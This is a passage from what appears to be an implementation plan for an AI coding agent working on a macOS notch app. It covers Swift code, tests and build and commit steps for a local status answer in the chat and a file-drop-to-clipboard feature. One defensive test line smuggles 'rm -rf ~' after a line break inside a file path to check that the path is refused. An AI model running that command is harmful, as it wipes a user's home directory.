        let sendAt = at("func send(query: String, context: PromptContext?, state: AppState) {", in: claude), sendEnd = at("\n    }\n", in: claude, from: sendAt)
        let sendBody = sendAt > 0 && sendEnd > sendAt ? String(claude.utf16[claude.utf16.index(claude.utf16.startIndex, offsetBy: sendAt)..<claude.utf16.index(claude.utf16.startIndex, offsetBy: sendEnd)])! : ""
        CT.checkTrue("the chat's send path asks the status answer first, once, and returns before it does anything else", !sendBody.isEmpty && count("SidekickChat.answer(query, state: state)", in: claude) == 1 && at("SidekickChat.answer(query, state: state)", in: sendBody) > 0 && at("SidekickChat.answer(query, state: state)", in: sendBody) < at("countdownTask?.cancel()", in: sendBody) && at("SidekickChat.answer(query, state: state)", in: sendBody) < at("ChatMessage(role: .user", in: sendBody) && sendBody.contains("if SidekickChat.answer(query, state: state) { return }"))
        CT.checkTrue("so no provider is chosen, no conversation is touched and no typing dots show for it", !sendBody.components(separatedBy: "if SidekickChat.answer(query, state: state) { return }").first!.contains("conversation") && !sendBody.components(separatedBy: "if SidekickChat.answer(query, state: state) { return }").first!.contains("stateOverride"))
        CT.checkTrue("the answer goes only into the chat's list on screen: the file never names a conversation, a provider, the router or a file's context", !chat.contains("conversation") && !chat.contains("ClaudeService") && !chat.contains("AIService") && !chat.contains("ModelRouter") && !chat.contains("promptContext") && !chat.contains("droppedFile") && !chat.contains("clearConversation") && chat.contains("state.chatHistory.append(ChatMessage(role: .user, content: query))"))
        CT.checkTrue("the reply says where it came from, and the question needs the whole message (the matcher is the engine's)", chat.contains("reply.caption = caption") && chat.contains("\"From NotchMeow, on this Mac\"") && chat.contains("engine.status(for: query)"))
        CT.checkTrue("the chip is in the chat's empty state, once", count("SidekickStatusChip(state: state)", in: view) == 1 && view.contains("SidekickStatusChip(state: state)   // the empty chat's one chip") && code(source("SidekickChat.swift")).contains("if !Sidekick.shared.liveAgents.isEmpty {"))

        CT.section("Settings → Sidekick: a new section in the existing style, and nothing existing is restyled")
        let settingsView = source("SettingsView.swift"), sidekickSettings = source("SidekickSettingsView.swift")
```

- [ ] **Step 2: Run the pins to make them fail**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|passed|failed"`
Expected: FAIL: the chat pins (`✗ the status question is answered first…`) and `N test(s) failed.`.

- [ ] **Step 3: Write the answer and the chip**

**Create `NotchBuddy/Sources/App/SidekickChat.swift`**

```swift
import SwiftUI

// "What's Claude doing?" in the chat, answered on this Mac. The chat's send path asks `answer` FIRST and returns before it chooses a provider, touches the model's history or shows the typing dots, so a question
// like this one is never part of what a model is sent: the question and the answer go only into the chat's list on screen (`AppState.chatHistory`, which no provider reads: what a model is sent is the
// chat service's own history, which this file never reaches), and a dropped file's context is not reset. If the chat is on a cloud model, nothing about the question or its answer is sent anywhere.
// The words are the engine's (`SidekickEngine.status(for:)`, from the ledger); the local voice may reword them by the same rules as a recap, in the background, after the template is shown.

@MainActor
enum SidekickChat {
    /// The line under the answer, where a model's reply says "cloud · Claude Sonnet 5.5".
    static let caption = "From NotchMeow, on this Mac"
    /// The words of the chip in the chat's empty state.
    static let chipText = "What's Claude doing?"

    /// Answers `query` here when it is the status question (a whole short message), and returns true; otherwise nothing happens and it returns false, and the message is a normal one.
    @discardableResult
    static func answer(_ query: String, state: AppState = .shared, engine: SidekickEngine = Sidekick.shared.engine) -> Bool {
        guard let answered = engine.status(for: query) else { return false }
        state.chatHistory.append(ChatMessage(role: .user, content: query))
        var reply = ChatMessage(role: .assistant, content: answered.lines.joined(separator: "\n"))
        reply.caption = caption
        state.chatHistory.append(reply)
        // A nicer sentence from a model on this computer, if there is one in time: it replaces the words once.
        if SidekickStore.shared.settings.local, !answered.facts.isEmpty {
            let id = reply.id
            Task { @MainActor in
                guard let nicer = await SidekickVoiceApp.nicer(lines: answered.lines, facts: answered.facts),
                      let i = state.chatHistory.firstIndex(where: { $0.id == id }) else { return }
                state.chatHistory[i].content = nicer
            }
        }
        return true
    }
}

/// The chip in the chat's empty state: one tap asks the question. It shows only while an agent has a live session (there is something to answer); with none it is not drawn at all.
struct SidekickStatusChip: View {
    @ObservedObject var state: AppState

    @ViewBuilder var body: some View {
        if !Sidekick.shared.liveAgents.isEmpty {
        Button { SidekickChat.answer(SidekickChat.chipText, state: state) } label: {
            HStack(spacing: 5) {
                Image(systemName: "sparkles").font(.system(size: 8)).foregroundColor(Color(hex: "#5C6370"))
                Text(SidekickChat.chipText)
                    .font(.system(size: 10.5, weight: .medium))
                    .foregroundColor(Color(hex: "#7B8089"))
            }
            .padding(.horizontal, 8).padding(.vertical, 4)
            .background(Color.white.opacity(0.06))
            .clipShape(Capsule())
        }
        .buttonStyle(.plain)
        .padding(.horizontal, 10)
        }
    }
}
```

- [ ] **Step 4: Answer before anything else, and show the chip**

**Edit `NotchBuddy/Sources/App/ClaudeService.swift`** (the find text occurs exactly once)

Find:

```swift
    /// Sends a message; Stop cancels it.
    func send(query: String, context: PromptContext?, state: AppState) {
        countdownTask?.cancel()
        // Only the newest partial reply keeps Continue · Retry: they act on the last exchange.
```

Replace with:

```swift
    /// Sends a message; Stop cancels it.
    func send(query: String, context: PromptContext?, state: AppState) {
        // "What's Claude doing?" is answered here, from the sidekick's ledger, before a provider is chosen: it never reaches the model's history, so a cloud model never sees it.
        if SidekickChat.answer(query, state: state) { return }
        countdownTask?.cancel()
        // Only the newest partial reply keeps Continue · Retry: they act on the last exchange.
```

**Edit `NotchBuddy/Sources/App/IslandViewContent.swift`** (the find text occurs exactly once)

Find:

```swift
                } else {
                    Spacer()
                }

```

Replace with:

```swift
                } else {
                    Spacer()
                    SidekickStatusChip(state: state)   // the empty chat's one chip: asking it is answered on this Mac (SidekickChat)
                }

```

- [ ] **Step 5: Run the pins and the build**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | tail -1; bash scripts/test-chat-parsing.sh 2>&1 | tail -1`
Expected: two lines, each `All tests passed.`

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 6: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): "What's Claude doing?" answered in the chat from the ledger, on this Mac

The chat's send path checks the status question first and returns before a provider is chosen; the answer goes only into the chat's list on screen, never into a conversation, so a cloud model never sees it. A chip in the empty chat asks it, and it is drawn only while an agent has a live session (owner's answer, 2026-10-14).

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickChat.swift NotchBuddy/Sources/App/ClaudeService.swift NotchBuddy/Sources/App/IslandViewContent.swift tests/SidekickWiringTests.swift NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 18: Drop a file on an agent's own cat

**Agent:** `nm-implementer-deep` (**Sonnet 5.5, high: CLAUDE.md trigger 1**, AppKit's drag destination, the order of the drop rules and the island's expansion).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickDrop.swift`, `NotchBuddy/Sources/App/SidekickDropApp.swift`, `tests/SidekickDropTests.swift`, `scripts/test-sidekick-drop.sh`
- Modify: `NotchBuddy/Sources/App/FileDropView.swift`, `NotchBuddy/Sources/App/IslandWindowController.swift`, `NotchBuddy/Sources/App/AppState.swift`, `NotchBuddy/Sources/App/IslandRootView.swift` (`CompactMiniGrid`), `NotchBuddy/Sources/App/PairCatViews.swift` (`SecondCatPlacement`, `PairCatCanvasView`), `NotchBuddy/Sources/App/BotCanvasView.swift` (`MiniBotCanvasView`), `tests/SidekickWiringTests.swift`, `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)

**Interfaces:**
- Consumes: Task 13's `AgentTarget.bringForward(pillId:)` and `IslandWindowController`'s `.hookExpand`, Task 9's `SidekickEngine.liveAgents`, `AppState.cast` (`pills`, `second`), `CatDisplaySettings.isAgentPill`, `islandSize(mode:view:progress:nw:nh:)`, `secondCatPlace(state:islandW:islandH:)`, `IslandRestingLayout`, `CatIslandLayout`, `showNote` (the island's one-line note), `BotEmote.happy`.
- Produces: `SidekickDrop` (`Cat`, `gridCats(pills:panelWidth:islandWidth:islandHeight:)`, `agentCatAt(x:y:cats:live:)`, `clipboardText(paths:)`, `line(agentName:count:)`, `refusedLine(agentName:)`), `SidekickDropApp` (`agentCat(atWindowPoint:state:)`, `handoff(urls:pillId:state:)`), `FileDropNSView.agentCatAt` / `.onAgentDragOver` / `.onAgentDrop`, `AppState.sidekickDropPill`, `Notification.Name.sidekickCatEmote`.

**Only a drop on an agent's own cat hands over a path; the big cat is not a target and every other drop is exactly what it was.** The targets are a cat that stands for one agent and is not the big cat: in **A cat for each agent** mode an agent's cat in the compact island's grid (its pill cat, which wears that agent's coat), and in **Two cats** mode cat 2 (the busiest other agent). In One cat mode the grid's cats wear the Main cat and stand for no agent of their own, so they are not targets. A drop on such a cat, **whose agent has a live session in the ledger** (`SidekickEngine.liveAgents`), copies the file's **original path** to the clipboard (one file is its plain path, several are one path per line, no quotes; a path with a line break or another control character is never copied, because a pasted line break would run what follows in a terminal), brings that agent's app forward by the same routes the pill's ↗ button uses (`AgentTarget`) and shows one line: **`Copied the path — paste it into Claude Code`**. The agent's cat gives the happy emote. **Nothing is pasted, typed or sent to another app, no `claude --resume` and no second process, and the line never says "sent", "delivered" or "attached"**: the hooks are one-way, so NotchMeow has no channel into a running agent.

**The order of the drop rules.** `FileDropNSView` is G1's now (it rules out the app's own drags, reads the pasteboard's kinds and decides Ask or Shelf by the pointer's half). The agent-cat test goes **right after the own-drag guard and the kinds check** in every drag callback (entered, updated, exited and the drop), before the island's drop view opens and before `operation(...)`, `halfAt` and `onShelfDrop`: while the pointer is on such a cat and the drag carries file URLs, the island does not expand to the drop view and G1's Shelf highlight does not light up; if the pointer leaves the cat, the drop view opens at that moment as it would have at the start. **G1's Ask and Shelf halves therefore apply only to what the agent-cat test does not take**: the big cat's area, the island, everything else, exactly as G1 ships. A subtle edge, pinned: with `FileDropNSView`'s new `zoneEntered` flag the drop view's `onDragExited` is called exactly when `onDragEntered` was, so nothing that ships changes for any other drag. Overview pill cats (the expanded island's task rows) are not drop targets (owner's answer, 2026-10-14).

- [ ] **Step 1: Write the failing test and pins**

The pure program checks the grid cats' circles (four cells 16 pt apart, centred 40 pt in from the island's right edge, shrunk on a strip under 32 pt; a pill that wears no agent's coat is not a target), which cat is under a point (and only for a live agent; the nearer centre wins and a tie goes to the first), and the clipboard text (one path, several paths, a line break or an escape is refused) and the lines.

**Create `tests/SidekickDropTests.swift`**

```swift
import Foundation

// The agent-cat drop rules: the grid cats' circles, which cat is under a point (and only for an agent with a live session), what goes on the clipboard and the line the island shows.
// Run through scripts/test-sidekick-drop.sh.

@main
enum SidekickDropTests {
    typealias D = SidekickDrop

    @MainActor static func main() {
        CT.section("the compact grid: four cells, 16 pt apart, centred 40 pt in from the island's right edge")
        let pills: [(pill: String, agent: Bool)] = [("agent_codex", true), ("integration_github", false), ("agent_gemini", true), ("agent_antigravity", true)]
        let cats = D.gridCats(pills: pills, panelWidth: 720, islandWidth: 300, islandHeight: 32)
        CT.check("the pill that wears no agent's coat is not a target", cats.map(\.pill), ["agent_codex", "agent_gemini", "agent_antigravity"])
        CT.check("top left of the grid: 8 pt left of and 8 pt above the centre (island left 210, right 510, centre 470, 16 down)", [cats[0].x, cats[0].y, cats[0].r], [462, 8, 8])
        CT.check("bottom left", [cats[1].x, cats[1].y], [462, 24])
        CT.check("bottom right", [cats[2].x, cats[2].y], [478, 24])
        let strip = D.gridCats(pills: pills, panelWidth: 720, islandWidth: 300, islandHeight: 24)
        CT.checkNear("a strip of 24 pt shrinks the grid like the island's grid does (20 / 28)", strip[0].r, 8 * 20.0 / 28.0)
        CT.check("at most four cells", D.gridCats(pills: (0..<6).map { ("agent_x\($0)", true) }, panelWidth: 720, islandWidth: 300, islandHeight: 32).count, 4)

        CT.section("which cat is under the point")
        let live: Set<String> = ["agent_codex", "agent_gemini"]
        CT.check("on a cat with a live session", D.agentCatAt(x: 462, y: 8, cats: cats, live: live), "agent_codex")
        CT.check("at the edge of the circle", D.agentCatAt(x: 470, y: 8, cats: cats, live: live), "agent_codex")
        CT.check("just outside it", D.agentCatAt(x: 470.1, y: 8, cats: cats, live: live), nil)
        CT.check("on a cat whose agent has no live session: the drop is what it always was", D.agentCatAt(x: 478, y: 24, cats: cats, live: live), nil)
        CT.check("on the second live cat", D.agentCatAt(x: 462, y: 24, cats: cats, live: live), "agent_gemini")
        CT.check("anywhere else on the island", D.agentCatAt(x: 300, y: 16, cats: cats, live: live), nil)
        CT.check("two circles that overlap: the nearer centre wins", D.agentCatAt(x: 6, y: 0, cats: [D.Cat(pill: "agent_a", x: 0, y: 0, r: 8), D.Cat(pill: "agent_b", x: 10, y: 0, r: 8)], live: ["agent_a", "agent_b"]), "agent_b")
        CT.check("a tie goes to the first", D.agentCatAt(x: 5, y: 0, cats: [D.Cat(pill: "agent_a", x: 0, y: 0, r: 8), D.Cat(pill: "agent_b", x: 10, y: 0, r: 8)], live: ["agent_a", "agent_b"]), "agent_a")
        CT.check("no cats, no target", D.agentCatAt(x: 0, y: 0, cats: [], live: live), nil)
        CT.check("a point that is not a number is on nothing", D.agentCatAt(x: .nan, y: 8, cats: cats, live: live), nil)

        CT.section("the clipboard and the line")
        CT.check("one file: its plain path", D.clipboardText(paths: ["/Users/me/My Files/a b.txt"]), "/Users/me/My Files/a b.txt")
        CT.check("several files: one path per line, no quotes", D.clipboardText(paths: ["/a/1.txt", "/a/2 x.txt"]), "/a/1.txt\n/a/2 x.txt")
        CT.check("no file, nothing", D.clipboardText(paths: []), nil)
        CT.check("a path with a line break is never copied: a pasted line break would run what follows", D.clipboardText(paths: ["/a/ok.txt", "/a/x\nrm -rf ~"]), nil)
        CT.check("nor one with an escape or a tab", [D.clipboardText(paths: ["/a/\u{1B}[2J"]), D.clipboardText(paths: ["/a/\tb"])], [nil, nil])
        CT.check("the line for one path", D.line(agentName: "Claude Code", count: 1), "Copied the path \u{2014} paste it into Claude Code")
        CT.check("the line for several", D.line(agentName: "Codex", count: 3), "Copied 3 paths \u{2014} paste them into Codex")
        let words = [D.line(agentName: "Claude Code", count: 1), D.line(agentName: "Codex", count: 2), D.refusedLine(agentName: "x")].joined(separator: " ").lowercased()
        CT.check("no line says sent, delivered or attached", ["sent", "delivered", "attached"].filter { words.contains($0) }, [])
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-drop.sh`**

```bash
#!/usr/bin/env bash
# Sidekick drop on an agent's own cat: the grid cats' circles, the hit test, the clipboard text and the line. Pure Foundation.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-drop.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

swiftc -swift-version 6 \
    NotchBuddy/Sources/App/SidekickDrop.swift \
    tests/CatTestSupport.swift tests/SidekickDropTests.swift \
    -o "$TEST_DIR/sidekick-drop-tests"
"$TEST_DIR/sidekick-drop-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-drop.sh`

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
    /// The offset of the first `needle` at or after `from`, or -1.
    static func at(_ needle: String, in text: String, from: Int) -> Int { from < 0 ? -1 : text.range(of: needle, range: String.Index(utf16Offset: from, in: text)..<text.endIndex)?.lowerBound.utf16Offset(in: text) ?? -1 }

    @MainActor static func main() {
```

Replace with:

```swift
    /// The offset of the first `needle` at or after `from`, or -1.
    static func at(_ needle: String, in text: String, from: Int) -> Int { from < 0 ? -1 : text.range(of: needle, range: String.Index(utf16Offset: from, in: text)..<text.endIndex)?.lowerBound.utf16Offset(in: text) ?? -1 }

    /// The code of a file without its comments (the text from `//` to the end of each line): a pin about what the code does is not about what its comments say.
    static func code(_ text: String) -> String { text.components(separatedBy: "\n").map { l in l.range(of: "//").map { String(l[..<$0.lowerBound]) } ?? l }.joined(separator: "\n") }

    @MainActor static func main() {
```

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("\"What's Claude doing?\": answered on this Mac, before a provider is chosen, and never added to a conversation")
        let claude = source("ClaudeService.swift"), chat = source("SidekickChat.swift")
```

Replace with:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("a drop on an agent's own cat: the test runs first in every drag callback, the big cat is never a target, and nothing is pasted")
        let drop = source("FileDropView.swift"), dropApp = source("SidekickDropApp.swift"), pure = source("SidekickDrop.swift")
        func body(_ file: String, from start: String, to end: String) -> String { let a = at(start, in: file), b = at(end, in: file, from: a); return a >= 0 && b > a ? String(file.utf16[file.utf16.index(file.utf16.startIndex, offsetBy: a)..<file.utf16.index(file.utf16.startIndex, offsetBy: b)])! : "" }
        let entered = body(drop, from: "override func draggingEntered", to: "override func draggingUpdated"), updated = body(drop, from: "override func draggingUpdated", to: "override func draggingExited"), exited = body(drop, from: "override func draggingExited", to: "override func performDragOperation"), performed = body(drop, from: "override func performDragOperation", to: "// MARK: - File drop handler")
        CT.checkTrue("entered: the app's own drags are ruled out, then the agent test is next, and the island's drop view (and G1's halves) come only after it answers nil", entered.contains("if kinds.contains(.fileURL), let pill = agentCatAt?(sender.draggingLocation) { setOverAgentCat(pill); return .copy }") && at("isOwnDrag(", in: entered) < at("agentCatAt?(", in: entered) && at("agentCatAt?(", in: entered) < at("onDragEntered?(", in: entered) && at("agentCatAt?(", in: entered) < at("operation(sender", in: entered))
        CT.checkTrue("updated: the same, and a pointer that leaves the cat opens the drop view then, once", updated.contains("if kinds.contains(.fileURL), let pill = agentCatAt?(sender.draggingLocation) { setOverAgentCat(pill); return .copy }") && updated.contains("if !zoneEntered { zoneEntered = true; onDragEntered?(sender.draggingLocation) }") && at("agentCatAt?(", in: updated) < at("onDragUpdated?(", in: updated))
        CT.checkTrue("exited: the drop view hears of the exit exactly when it heard of the entry", exited.contains("if zoneEntered { zoneEntered = false; onDragExited?() }") && count("onDragExited?()", in: drop) == 1 && count("onDragEntered?(", in: drop) == 2)
        CT.checkTrue("the drop: a drop on an agent's cat goes to its own handler, before the Ask and Shelf halves and the shipped drop rule (the big cat's drop is the old one)", performed.contains("onAgentDrop?(urls, pill)") && at("agentCatAt?(", in: performed) < at("let half =", in: performed) && at("agentCatAt?(", in: performed) < at("onShelfDrop?(", in: performed) && at("agentCatAt?(", in: performed) < at("onFilesDropped?(urls)", in: performed) && count("onFilesDropped?(urls)", in: drop) == 1 && count("onShelfDrop?(", in: drop) == 1)
        CT.checkTrue("it says in the file that G1's halves come after it", drop.contains("G1's Ask and Shelf halves, which apply only when it answers nil"))
        CT.checkTrue("the island's window wires the three closures, with the live agents from the ledger", window.contains("dropView.agentCatAt = { [weak self] loc in self?.sidekickAgentCat(at: loc) }") && window.contains("dropView.onAgentDrop = { urls, pill in SidekickDropApp.handoff(urls: urls, pillId: pill) }") && window.contains("live: Sidekick.shared.liveAgents"))
        CT.checkTrue("the targets are the grid's cats and cat 2, never the big cat", dropApp.contains("state.cast.pills") && dropApp.contains("state.cast.second") && !dropApp.contains("cast.big") && dropApp.contains("state.displayMode == .perAgent") && dropApp.contains("CatDisplaySettings.isAgentPill"))
        let dropCode = code(dropApp)
        CT.checkTrue("the path goes to the clipboard once and nothing is pasted, typed or sent to another app", count("NSPasteboard.general", in: dropCode) == 1 && count("setString(text, forType: .string)", in: dropCode) == 1 && !dropCode.contains("CGEvent") && !dropCode.contains("keyDown") && !dropCode.contains("NSAppleScript") && !dropCode.contains("Process(") && !dropCode.contains("--resume") && !dropCode.contains("paste") && !dropCode.contains("typeText"))
        CT.checkTrue("the agent's app comes forward by the pill's own routes, and the line comes from the rules (never sent, delivered or attached)", dropApp.contains("AgentTarget.bringForward(pillId: pillId)") && dropApp.contains("SidekickDrop.line(agentName: name, count: urls.count)") && !code(pure).lowercased().contains("delivered") && !dropCode.lowercased().contains("delivered") && !code(pure).lowercased().contains("attached"))
        CT.checkTrue("the drag-over ring and the agent cat's emote are additive and keyed by the agent's pill", source("AppState.swift").contains("@Published var sidekickDropPill: String? = nil") && source("IslandRootView.swift").contains("state.sidekickDropPill == other.task.id") && source("PairCatViews.swift").contains("state.sidekickDropPill == id") && source("BotCanvasView.swift").contains("(note.object as? String) == task.id"))

        CT.section("\"What's Claude doing?\": answered on this Mac, before a provider is chosen, and never added to a conversation")
        let claude = source("ClaudeService.swift"), chat = source("SidekickChat.swift")
```

- [ ] **Step 2: Run them to make them fail**

Run: `bash scripts/test-sidekick-drop.sh 2>&1 | head -3; bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|passed|failed"`
Expected: FAIL: `error opening input file` for `SidekickDrop.swift`, and the drop pins of the wiring test, ending `N test(s) failed.`.

- [ ] **Step 3: Write the rules**

**Create `NotchBuddy/Sources/App/SidekickDrop.swift`**

```swift
import Foundation

// Drop a file on an agent's own cat: the pure rules. Only a cat that stands for ONE agent and is not the big cat is a target: in "A cat for each agent" mode an agent's cat in the compact
// island's grid, and in "Two cats" mode cat 2. The big cat's drop is not touched here (it stays the chat or Ask drop, and after sub-project G1 the Ask and Shelf halves), and nothing here
// opens a file or sends anything to another app: a drop on an agent's cat copies the file's ORIGINAL path to the clipboard and brings that agent's terminal or editor forward, and the line
// says exactly that. The hit test runs before every other drop rule and only for an agent that has a live session in the ledger; anywhere else the drop is what it always was. Foundation only.

enum SidekickDrop {
    /// A circle a drop can land in, in the island panel's own coordinates (points, x from the panel's left, y down from its top), for the agent it stands for.
    struct Cat: Equatable, Sendable {
        var pill: String
        var x: Double
        var y: Double
        var r: Double
    }

    /// The cats of the compact island's 2x2 grid (`CompactMiniGrid`): cells 16 pt between centres, the grid's centre 40 pt in from the island's right edge and half the strip's height down, all
    /// shrunk like `IslandRestingLayout.miniGridScale` on a strip shorter than 32 pt. `pills` is the grid's pills in the grid's order (top left, top right, bottom left, bottom right; at most four),
    /// each with whether it wears its own agent's coat (A cat for each agent mode): only those are targets. `panelWidth` is the island panel's width and `islandWidth` the compact island's.
    static func gridCats(pills: [(pill: String, agent: Bool)], panelWidth: Double, islandWidth: Double, islandHeight: Double) -> [Cat] {
        let k = min(1, max(0, islandHeight - 4) / 28), left = (panelWidth - islandWidth) / 2
        let gx = left + islandWidth - 40, gy = islandHeight / 2, s = 8 * k
        return pills.prefix(4).enumerated().compactMap { i, p in
            p.agent ? Cat(pill: p.pill, x: gx + (i % 2 == 1 ? s : -s), y: gy + (i < 2 ? -s : s), r: s) : nil
        }
    }

    /// The agent whose cat is under the point, and only when that agent has a live session. The nearest centre wins, a tie goes to the first. nil: the drop is what it always was.
    static func agentCatAt(x: Double, y: Double, cats: [Cat], live: Set<String>) -> String? {
        var best: (pill: String, d: Double)?
        for c in cats where live.contains(c.pill) {
            let d = (x - c.x) * (x - c.x) + (y - c.y) * (y - c.y)
            if d <= c.r * c.r, best == nil || d < best!.d { best = (c.pill, d) }
        }
        return best?.pill
    }

    private static func hasControl(_ s: String) -> Bool {
        s.unicodeScalars.contains { $0.value < 0x20 || (0x7F...0x9F).contains($0.value) || $0.value == 0x2028 || $0.value == 0x2029 }
    }

    /// What goes on the clipboard: one path is its plain path, several are one path per line, with no quotes. nil when a path has a line break or another control character: a pasted line
    /// break would run what follows it in a terminal, so such a path is not copied at all.
    static func clipboardText(paths: [String]) -> String? {
        guard !paths.isEmpty, !paths.contains(where: hasControl) else { return nil }
        return paths.joined(separator: "\n")
    }

    /// The one line the island shows. It never says sent, delivered or attached: NotchMeow has no channel into a running agent.
    static func line(agentName: String, count: Int) -> String {
        count == 1 ? "Copied the path \u{2014} paste it into \(agentName)" : "Copied \(count) paths \u{2014} paste them into \(agentName)"
    }

    /// The line when a path could not be copied.
    static func refusedLine(agentName: String) -> String { "Not copied: that file\u{2019}s name has a line break. Drop it on the chat instead." }
}
```

- [ ] **Step 4: Run the pure test**

Run: `bash scripts/test-sidekick-drop.sh`
Expected: PASS. `the compact grid`, `which cat is under the point`, `the clipboard and the line`, 24 `✓` lines, then `All tests passed.`

- [ ] **Step 5: Write the app's side**

**Create `NotchBuddy/Sources/App/SidekickDropApp.swift`**

```swift
import AppKit

// A drop on an agent's own cat, in the app. The rules are `SidekickDrop` (tested); this is what only the app can do: find the cats under the pointer, copy the path to the clipboard, bring the agent's app
// forward (`AgentTarget`, the routes the pill's ↗ button uses) and say so in one line. The big cat is never a target: only the grid's cats in A cat for each agent mode and cat 2 in Two cats mode, and only
// for an agent that has a live session. NotchMeow never pastes, types or sends anything into another app (no key event is made here), never starts a process and never says "sent", "delivered" or "attached".

extension Notification.Name {
    /// An agent's own cat (a grid cat or cat 2) answers a drop on it with the happy emote: the object is the agent's pill ID.
    static let sidekickCatEmote = Notification.Name("notchBuddy.sidekickCatEmote")
}

@MainActor
enum SidekickDropApp {
    /// The agent whose own cat is under `loc` (the drag's place in the island panel's window, y up), and only when that agent has a live session. nil: the drop is what it always was.
    static func agentCat(atWindowPoint loc: CGPoint, panelWidth: Double, panelHeight: Double, live: Set<String>, state: AppState = .shared) -> String? {
        guard state.mode != .hidden, !live.isEmpty else { return nil }
        let (islandW, fixedH) = islandSize(mode: state.mode, view: state.view, progress: state.uploadProgress, nw: state.notchWidth, nh: state.notchHeight)
        let islandH: CGFloat = (state.mode == .expanded && state.view == .prompt) ? min(300, 240 + CGFloat(state.chatHistory.count) * 40) : fixedH
        var cats: [SidekickDrop.Cat] = []
        // The compact island's grid: only in A cat for each agent mode (in the other modes its cats wear the Main cat and stand for no agent), and only while it is drawn.
        if state.mode == .compact, state.displayMode == .perAgent, !state.wingYielded, !state.greetingTail {
            let pills = state.cast.pills.filter { p in state.tasks.contains { $0.id == p.pill } }.map { (pill: $0.pill, agent: CatDisplaySettings.isAgentPill($0.pill)) }
            cats += SidekickDrop.gridCats(pills: pills, panelWidth: panelWidth, islandWidth: Double(islandW), islandHeight: Double(islandH))
        }
        // Cat 2 of Two cats mode, where it is drawn (compact, or beside the big cat in the overview).
        if let pill = state.cast.second?.pill, let place = secondCatPlace(state: state, islandW: islandW, islandH: islandH) {
            let left = (panelWidth - Double(islandW)) / 2
            cats.append(SidekickDrop.Cat(pill: pill, x: left + Double(place.cx), y: Double(place.cy), r: place.compact ? Double(place.d / 0.6 / 2) : Double(place.d / 2)))
        }
        guard !cats.isEmpty else { return nil }
        return SidekickDrop.agentCatAt(x: Double(loc.x), y: panelHeight - Double(loc.y), cats: cats, live: live)
    }

    /// The drop: the original path (or paths, one per line) goes to the clipboard, the agent's app comes forward, the agent's cat is happy and the island says what was done. A path with a line break is
    /// refused, and the line says so. This is user-started, so it does not go through the show gate.
    static func handoff(urls: [URL], pillId: String, state: AppState = .shared) {
        let name = state.agentName(for: pillId)
        let line: String
        if let text = SidekickDrop.clipboardText(paths: urls.map(\.path)) {
            let board = NSPasteboard.general
            board.clearContents()
            board.setString(text, forType: .string)
            AgentTarget.bringForward(pillId: pillId)
            line = SidekickDrop.line(agentName: name, count: urls.count)
        } else {
            line = SidekickDrop.refusedLine(agentName: name)
        }
        NotificationCenter.default.post(name: .sidekickCatEmote, object: pillId)
        // One line, in the island's note, which opens the island the way a finished task does and folds it again a few seconds later.
        showNote(line, action: nil, state: state)
        NotificationCenter.default.post(name: .hookExpand, object: IslandView.note)
        DispatchQueue.main.asyncAfter(deadline: .now() + 4) {
            guard state.view == .note, state.noteMessage == line else { return }
            NotificationCenter.default.post(name: .islandCollapse, object: nil)
        }
    }
}
```

- [ ] **Step 6: Consult the test first in the drop view, and wire it**

**Edit `NotchBuddy/Sources/App/FileDropView.swift`** (the find text occurs exactly once)

Find:

```swift
    var onShelfDrop: (@MainActor (NSPasteboard, Set<DragKind>) -> Void)?

    override init(frame: NSRect) {
```

Replace with:

```swift
    var onShelfDrop: (@MainActor (NSPasteboard, Set<DragKind>) -> Void)?
    /// A drop on an agent's own cat (sub-project F1). It is consulted FIRST by every drag callback below, after the app's own drags are ruled out and before the island's drop view opens and before
    /// G1's Ask and Shelf halves, which apply only when it answers nil (so the shelf's highlight never lights up over an agent cat). Only file URLs go to an agent's cat. Without it every drop is
    /// what it always was.
    var agentCatAt: (@MainActor (CGPoint) -> String?)?
    var onAgentDragOver: (@MainActor (String?) -> Void)?
    var onAgentDrop: (@MainActor ([URL], String) -> Void)?
    /// The agent cat the drag is over now, and whether the island's drop view was told about this drag (`onDragEntered`): `onDragExited` follows `onDragEntered`, never alone.
    private var overAgentCat: String?
    private var zoneEntered = false

    private func setOverAgentCat(_ pill: String?) {
        guard pill != overAgentCat else { return }
        overAgentCat = pill
        onAgentDragOver?(pill)
    }

    override init(frame: NSRect) {
```

**Edit `NotchBuddy/Sources/App/FileDropView.swift`** (the find text occurs exactly once)

Find:

```swift
    override func draggingEntered(_ sender: NSDraggingInfo) -> NSDragOperation {
